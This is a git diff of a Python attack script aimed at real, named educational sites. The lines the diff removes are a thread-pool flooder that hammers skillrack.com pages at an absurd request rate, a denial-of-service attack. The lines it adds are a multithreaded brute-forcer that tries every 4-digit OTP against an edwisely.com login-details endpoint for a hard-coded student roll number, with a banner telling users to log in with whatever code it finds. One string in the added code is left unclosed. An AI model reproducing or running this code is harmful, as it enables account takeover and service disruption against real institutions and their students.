@@ -1,60 +1,99 @@
 import requests
+import concurrent.futures
+import colorama
+from colorama import init, Fore, Style
 import time
-import threading
-from concurrent.futures import ThreadPoolExecutor
-from requests.adapters import HTTPAdapter
-from requests.packages.urllib3.util.retry import Retry
 
-# List of target URLs
-urls = [
-    'https://skillrack.com',
-    'https://www.skillrack.com/faces/ui/profile.xhtml',
-    'https://www.skillrack.com/faces/candidate/codeprogram.xhtml'
-]
+init(autoreset=True)
 
-# Number of requests per second per URL
-requests_per_url_per_second = 9999999
+# Banner Display
+print(f"{Fore.YELLOW} ________        __                __                      __           ")
+print(f"{Fore.YELLOW}/        |      /  |              /  |                    /  |          ")
+print(f"{Fore.YELLOW}$$$$$$$$/   ____$$ | __   __   __ $$/   _______   ______  $$ | __    __ ")
+print(f"{Fore.YELLOW}$$ |__     /    $$ |/  | /  | /  |/  | /       | /      \ $$ |/  |  /  |")
+print(f"{Fore.YELLOW}$$    |   /$$$$$$$ |$$ | $$ | $$ |$$ |/$$$$$$$/ /$$$$$$  |$$ |$$ |  $$ |")
+print(f"{Fore.YELLOW}$$$$$/    $$ |  $$ |$$ | $$ | $$ |$$ |$$      \ $$    $$ |$$ |$$ |  $$ |")
+print(f"{Fore.YELLOW}$$ |_____ $$ \__$$ |$$ \_$$ \_$$ |$$ | $$$$$$  |$$$$$$$$/ $$ |$$ \__$$ |")
+print(f"{Fore.YELLOW}$$       |$$    $$ |$$   $$   $$/ $$ |/     $$/ $$       |$$ |$$    $$ |")
+print(f"{Fore.YELLOW}$$$$$$$$/  $$$$$$$/  $$$$$/$$$$/  $$/ $$$$$$$/   $$$$$$$/ $$/  $$$$$$$ |")
+print(f"{Fore.YELLOW}                                                              /  \__$$ |")
+print(f"{Fore.YELLOW}                                                              $$    $$/ ")
+print(f"{Fore.YELLOW}                                                               $$$$$$/ ")
 
-# Retry configuration
-retry_strategy = Retry(
-    total=3,  # Number of total retries
-    status_forcelist=[429, 500, 502, 503, 504],
-    allowed_methods=["HEAD", "GET", "OPTIONS"]  # Changed from method_whitelist
-)
-adapter = HTTPAdapter(max_retries=retry_strategy)
-http = requests.Session()
-http.mount("https://", adapter)
-http.mount("http://", adapter)
+print("   \n                                      \033[95m(-Developed by <Solitary>)\033[0m")
 
-def send_request(url):
-    try:
-        response = http.get(url)
-        print(f'{url}: Status Code: {response.status_code}')
-    except requests.exceptions.RequestException as e:
-        print(f'{url}: Error: {e}')
+print(f"{Fore.RED}\033[1mBefore running this Application,\033[0m")
+print(f"{Fore.RED}Make sure to visit the website, Enter your register number and Click <Login using OTP> in the next page.")
+print(f"{Fore.RED}Let this project find out the OTP for you.")
+print(f"{Fore.RED}After the program gives out the correct OTP, Immediately login with it.")
+print(f"{Fore.RED}Since the OTP is valid only for 10 minutes.")
 
-def run_requests(url, requests_per_second):
-    def send_in_batches():
-        with ThreadPoolExecutor(max_workers=requests_per_second) as executor:
-            futures = [executor.submit(send_request, url) for _ in range(requests_per_second)]
-            for future in futures:
-                future.result()
+url = 'https://dbchangesstudent.edwisely.com/auth/v3/getUserDetails'
 
-    while True:
-        start_time = time.time()
-        send_in_batches()
-        elapsed_time = time.time() - start_time
-        time_to_wait = max(0, 1 - elapsed_time)
-        time.sleep(time_to_wait)
 
-if __name__ == '__main__':
-    # Creating a separate thread for each URL to balance the load
-    threads = []
-    for url in urls:
-        thread = threading.Thread(target=run_requests, args=(url, requests_per_url_per_second))
-        thread.start()
-        threads.append(thread)
-    
-    # Waiting for all threads to complete
-    for thread in threads:
-        thread.join()
+params = {
+    'roll_number': '111723104080,
+    'otp': ''
+}
+
+headers = {
+    'Sec-Ch-Ua': '"Brave";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
+    'Accept': 'application/json, text/plain, */*',
+    'Sec-Ch-Ua-Mobile': '?0',
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
+    'Sec-Ch-Ua-Platform': '"Windows"',
+    'Sec-Gpc': '1',
+    'Accept-Language': 'en-US,en;q=0.5',
+    'Origin': 'https://nextgen.rmkec.ac.in',
+    'Sec-Fetch-Site': 'cross-site',
+    'Sec-Fetch-Mode': 'cors',
+    'Sec-Fetch-Dest': 'empty',
+    'Referer': 'https://nextgen.rmkec.ac.in/',
+    'Accept-Encoding': 'gzip, deflate, br',
+    'Priority': 'u=1, i',
+    'Connection': 'close'
+}
+
+def perform_attack():
+    num_workers = 50  # Number of concurrent threads
+    num_otp_per_thread = (10000 + num_workers - 1) // num_workers
+
+    correct_otps = []
+
+    with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
+        future_to_range = {}
+        for i in range(0, 10000, num_otp_per_thread):
+            end = min(i + num_otp_per_thread, 10000)
+            future = executor.submit(check_otp_range, i, end)
+            future_to_range[future] = (i, end)
+
+        for future in concurrent.futures.as_completed(future_to_range):
+            try:
+                result = future.result()
+                if result:
+                    correct_otps.append(result)
+                    if len(correct_otps) == 2:
+                        print(f"\n{Fore.GREEN}OTP found: {correct_otps[1]}")
+                        break
+            except Exception as e:
+                print(f"{Fore.RED}Exception: {e}")
+
+def check_otp_range(start, end):
+    for i in range(start, end):
+        otp = f'{i:04}'
+        params['otp'] = otp
+        try:
+            response = requests.get(url, params=params, headers=headers, verify=True)
+            response_length = len(response.text)
+            print(f"OTP: {otp}, Response Length: {response_length}")
+            if response.status_code == 200 and response_length > 1000:  
+                return otp
+        except requests.RequestException as e:
+            print(f"{Fore.RED}Request failed for OTP {otp}: {e}")
+
+    return None
+
+perform_attack()
+
+while True:
+    time.sleep(1)
